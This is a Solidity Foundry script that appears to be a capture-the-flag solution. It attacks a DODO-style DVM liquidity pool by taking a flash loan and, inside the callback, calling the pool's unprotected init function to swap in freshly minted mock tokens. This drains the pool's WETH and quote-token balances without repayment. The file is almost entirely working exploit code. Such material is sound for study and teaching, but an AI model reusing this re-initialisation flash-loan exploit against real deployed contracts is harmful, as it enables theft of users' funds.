// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "forge-std/Script.sol";


import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/Challenge.sol";



interface IDVM {
    function _QUOTE_TOKEN_() external view returns (address);
    function _BASE_TOKEN_() external view returns (address);
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;
}

contract MockERC20 is ERC20 {
    constructor(uint256 supply) ERC20("abc", "aa") {
        _mint(msg.sender, supply);
    }
}

contract MalFlash {
    IDVM public dvm;
    ERC20 public quoteAsset;
    ERC20 public baseAsset = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ERC20 public a1;
    ERC20 public a2;

    function setDVMAddr(address target) public {
        dvm = IDVM(target);
    }
    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
        address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;
        uint256 lpFeeRate = 3_000_000_000_000_000;
        uint256 i = 1;
        uint256 k = 1_000_000_000_000_000_000;
        bool isOpenTWAP = false;
        address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;

        a1 = ERC20(new MockERC20(type(uint112).max-10));
        a2 = ERC20(new MockERC20(type(uint112).max-10));
        dvm.init(maintainer, address(a1), address(a2), lpFeeRate, mtFeeRateModel, i, k, isOpenTWAP);

        a1.transfer(address(dvm), a1.balanceOf(address(this)));
        a2.transfer(address(dvm), a2.balanceOf(address(this)));
    }
    function run() public {
        quoteAsset = ERC20(dvm._QUOTE_TOKEN_());
        console.log("dvm quoteAsset address : %s", address(quoteAsset));
        dvm.flashLoan(baseAsset.balanceOf(address(dvm)), quoteAsset.balanceOf(address(dvm)), address(this), "kalos");
        console.log("WETH balance : %d", baseAsset.balanceOf(address(dvm)));
    }
}


contract Solve is Script {
    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();
        address prob = 0x908A5519B0c361FB94B1a2438f439E155E1e0b18;
        Challenge chal = Challenge(prob);
        MalFlash mf = new MalFlash();
        mf.setDVMAddr(chal.dvm());
        mf.run();
        vm.stopBroadcast();
    }
}